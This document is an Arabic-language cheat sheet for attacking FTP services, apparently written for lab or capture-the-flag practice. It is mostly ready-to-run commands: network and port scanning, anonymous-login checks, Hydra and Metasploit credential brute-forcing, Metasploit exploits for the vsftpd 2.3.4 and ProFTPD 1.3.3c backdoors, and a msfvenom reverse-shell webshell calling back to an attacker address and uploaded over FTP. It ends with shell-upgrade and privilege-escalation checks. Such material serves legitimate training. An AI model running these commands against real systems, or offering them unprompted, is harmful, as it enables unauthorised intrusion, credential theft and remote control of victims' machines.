1. Reconnaissance

تحديد هويتك على الشبكة وهوية الضحية قبل أي فحص

معرفة الـIP الخاص فيك KALI TERMINAL
ip a # أو ifconfig
لاحظ اسم الواجهة — tun0 إذا متصل VPN/Lab، أو eth0 بشبكة محلية
التأكد إن الهدف يستجيب KALI TERMINAL
ping -c 4 [TARGET]
✓ النتيجة المتوقعة: 4 packets transmitted, 0% packet loss
لو ما رد على ping، جرب فحص Nmap مباشرة بخيار -Pn (بعض الأجهزة تحجب ICMP لكن البورتات مفتوحة)
اكتشاف أجهزة الشبكة (لو ما عندك IP الضحية) KALI TERMINAL
nmap -sn [SUBNET] # أو netdiscover -r [SUBNET]

2. Port Scanning

من الفحص السريع للفحص الشامل — البورت الافتراضي مو دايم مضمون

فحص أولي + تحديد الإصدار KALI TERMINAL
nmap -sS -sV [TARGET]
✓ النتيجة المتوقعة: 21/tcp open ftp vsftpd 2.3.4 (أو أي إصدار آخر)
إذا ما طلع بورت 21 — افحص كل المدى TCP KALI TERMINAL
nmap -p- --min-rate=1000 -T4 [TARGET]
بعض الأنظمة تغيّر بورت FTP لبورت غير قياسي — دايم اعتبر -p- خطوة أساسية مو اختيارية قبل ما تستبعد الخدمة
فحص مركّز بعد اكتشاف البورت (سواء 21 أو غيره) KALI TERMINAL
nmap -p21 -sV -sC -A [TARGET]
لو البورت مختلف، استبدل 21 برقم البورت الفعلي في كل الأوامر الجاية

3. Enumeration

تحديد نوع وإصدار خدمة FTP بدقة، وفحص كل الاحتمالات قبل أي محاولة دخول

تحديد الإصدار (Service Detection)

فحص الإصدار عبر Nmap KALI TERMINAL
nmap -p21 -sV [TARGET]
✓ النتيجة المتوقعة: 21/tcp open ftp ProFTPD 1.3.5a (مثال)
فحص الإصدار عبر Metasploit MSFCONSOLE
use auxiliary/scanner/ftp/ftp_version set RHOSTS [TARGET] run

فحص Anonymous Login

عبر Nmap NSE KALI TERMINAL
nmap -p21 --script=ftp-anon [TARGET]
✓ Anonymous FTP login allowed (FTP code 230)
عبر Metasploit MSFCONSOLE
use auxiliary/scanner/ftp/anonymous set RHOSTS [TARGET] run
فحص يدوي مباشر KALI TERMINAL → FTP CLIENT
ftp [TARGET] # عند طلب username anonymous # عند طلب password (فاضي أو أي إيميل) [Enter]
إذا دخلت بدون كلمة مرور فعلية ورجع لك 230 Login successful ثم ftp> = Anonymous مفعّل

معلومات إضافية عن الخادم

System Info عبر Nmap NSE KALI TERMINAL
nmap -p21 --script=ftp-syst [TARGET]
فحص شامل للثغرات المعروفة KALI TERMINAL
nmap -p21 --script vuln [TARGET]
يكشف ثغرات موثقة زي vsftpd 2.3.4 backdoor (CVE-2011-2523) مباشرة إذا كانت النسخة مطابقة

تصفح الملفات (بعد أي دخول ناجح)

أوامر داخل جلسة FTP FTP CLIENT
ftp> ls -la ftp> cd [DIR] ftp> get [FILE] ftp> binary # قبل تنزيل ملفات ثنائية ftp> mget * # تنزيل كل الملفات بالمسار الحالي

4. Credential Testing

إذا Anonymous ما اشتغل — جرب Brute Force

Brute-force عبر Hydra KALI TERMINAL
hydra -L [USERLIST] -P [WORDLIST] [TARGET] -t 4 ftp
قوائم جاهزة بكالي: /usr/share/metasploit-framework/data/wordlists/common_users.txt و unix_passwords.txt
Brute-force عبر Metasploit MSFCONSOLE
use auxiliary/scanner/ftp/ftp_login set RHOSTS [TARGET] set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt run
✓ مثال نتيجة فعلية من لاب FTP Enumeration: [+] [TARGET]:21 - Login Successful: [USERNAME]:[PASSWORD]
الدخول بالبيانات المكتشفة KALI TERMINAL
ftp [TARGET] # Username: [USERNAME] # Password: [PASSWORD]
✓ 230 User [USERNAME] logged in

5. Exploitation

حسب الإصدار والنظام المكتشف — لا تجرب Exploit إلا لما تتطابق النسخة

Linux — vsftpd 2.3.4 Backdoor LINUX

الاستغلال الكامل خطوة بخطوة MSFCONSOLE
msfconsole -q use exploit/unix/ftp/vsftpd_234_backdoor set RHOST [TARGET] exploit
✓ [+] Backdoor service has been spawned... ✓ [+] Command shell session 1 opened $ whoami root
هذا الباب الخلفي يفتح شل مباشرة على بورت 6200 ويعطيك صلاحية root فورًا — لا يحتاج privesc إضافي

Linux — ProFTPD 1.3.3c Backdoor LINUX

مسار بديل حسب الإصدار MSFCONSOLE
use exploit/unix/ftp/proftpd_133c_backdoor set RHOST [TARGET] exploit

Windows — IIS FTP WINDOWS

رفع Webshell (لو FTP بصلاحية كتابة) KALI TERMINAL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f asp -o shell.asp
FTP على IIS غالبًا يستخدم حسابات مستخدمين حقيقية على النظام — بعد رفع الـwebshell لازم توصله عبر متصفح على نفس المسار (IIS root) عشان ينفّذ
رفع الملف داخل جلسة FTP FTP CLIENT
ftp> binary ftp> put shell.asp
تحذير: لا تشغّل أي exploit قبل ما تتأكد من الإصدار عبر -sV أو ftp_version. تشغيل exploit خاطئ يفشل أو يكشف وجودك بدون فايدة.

6. Post-Exploitation

بعد الحصول على شل عبر FTP — الخطوات الفورية (التفاصيل الكاملة بملف Post-Exploitation المنفصل)

التأكد من الهوية والصلاحية VICTIM SHELL
whoami id
تحويل الشل لشل تفاعلي (لو Linux) VICTIM SHELL
python3 -c 'import pty; pty.spawn("/bin/bash")'
فحص صلاحيات الرفع (لو ما كنت root من البداية) VICTIM SHELL
sudo -l find / -perm -4000 -type f 2>/dev/null
للمرحلة الأوسع بعد الوصول، استخدم Linux_Post_Exploitation_Cheatsheet.html أو Windows_Post_Exploitation_Cheatsheet.html حسب الهدف، ومعها Pivoting_Cheatsheet.html وCredential_Access_Cheatsheet.html عند الحاجة — هذا القسم للخطوات الفورية بعد دخول FTP فقط.
